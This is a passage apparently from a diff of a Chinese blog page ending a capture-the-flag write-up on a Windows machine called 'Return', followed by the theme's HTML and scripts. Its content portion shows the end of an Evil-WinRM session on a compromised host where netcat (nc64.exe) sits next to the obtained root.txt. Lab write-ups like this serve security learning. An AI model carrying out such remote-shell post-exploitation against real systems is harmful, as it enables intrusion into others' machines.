class="hljs-code">  0%</span><br><span class="hljs-code">100%</span><br><span class="hljs-code"></span><br><span class="hljs-code">------------------------------------------------------------------------------</span><br><br><span class="hljs-code">               Total    Copied   Skipped  Mismatch    FAILED    Extras</span><br><span class="hljs-code">    Dirs :         1         0         1         0         0         0</span><br><span class="hljs-code">   Files :         2         2         0         0         0         1</span><br><span class="hljs-code">   Bytes :       316       316         0         0         0    44.2 k</span><br><span class="hljs-code">   Times :   0:00:00   0:00:00                       0:00:00   0:00:00</span><br><span class="hljs-code">   Ended : Wednesday, January 14, 2026 8:43:07 PM</span><br><br><span class="hljs-strong">*Evil-WinRM*</span> PS C:\Temp&gt; dir<br><br><br><span class="hljs-code">    Directory: C:\Temp</span><br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-bullet">----                </span>-------------         ------ ----<br>-a----        1/14/2026   8:22 PM          45272 nc64.exe<br>-ar---        1/14/2026   6:18 PM             34 root.txt<br><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/windows/" class="print-no-link">#windows</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>从零开始的windows生活-Return</div>
+      <div>http://example.com/2026/01/15/从零开始的windows生活-Return/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Skyarrow</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>January 15, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/01/14/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84windows%E7%94%9F%E6%B4%BB-Timelapse/" title="从零开始的windows生活-Timelapse">
+                        <span class="hidden-mobile">从零开始的windows生活-Timelapse</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <style>.statistics { display: none !important; }</style>
+<a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+<br>
+<script async src="//cdn.busuanzi.cc/busuanzi/3.6.9/busuanzi.min.js"></script>
+<span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_site_pv" style="color:red">...</span> 次 </span> &nbsp; | &nbsp; <span id="busuanzi_container_site_uv"> 总访客数 <span id="busuanzi_site_uv" style="color:red">...</span> 人 </span> 
+    </div>
+  
+  
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
